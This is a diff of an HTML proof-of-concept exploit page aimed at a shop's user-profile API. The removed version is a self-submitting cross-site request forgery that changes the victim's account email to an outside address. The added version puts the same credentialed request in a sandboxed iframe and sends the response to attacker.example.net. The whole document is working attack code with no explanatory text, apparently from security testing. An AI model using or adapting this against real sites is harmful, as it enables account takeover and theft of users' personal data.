@@ -1,25 +1,16 @@
 <html>
-  <body>
-  <script>history.pushState('', '', '/')</script>
-    <script>
-      function submitRequest()
-      {
-        var xhr = new XMLHttpRequest();
-        xhr.open("PATCH", "https:\/\/shop.sprouts.com\/api\/v2\/user\/profile", true);
-        xhr.setRequestHeader("Accept", "*\/*");
-        xhr.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.7,en;q=0.3");
-        xhr.setRequestHeader("Content-Type", "application\/json");
-        xhr.withCredentials = true;
-        var body = "{\"email\":\"butanenacho111@gmail.com\"}";
-        var aBody = new Uint8Array(body.length);
-        for (var i = 0; i < aBody.length; i++)
-          aBody[i] = body.charCodeAt(i); 
-        xhr.send(new Blob([aBody]));
-      }
-      submitRequest();
-    </script>
-    <form action="#">
-      <input type="button" value="Submit request" onclick="submitRequest();" />
-    </form>
-  </body>
-</html>
+<body>
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+  var req = new XMLHttpRequest ();
+  req.onload = reqListener;
+  req.open('patch','https://shop.sprouts.com/api/v2/user/profile',true);
+  req.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  req.withCredentials = true;
+  req.send('{"email":"butanenacho111@gmail.com"}');
+
+  function reqListener() {
+    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
+   };
+</script>"></iframe>
+</body>
+</html>  
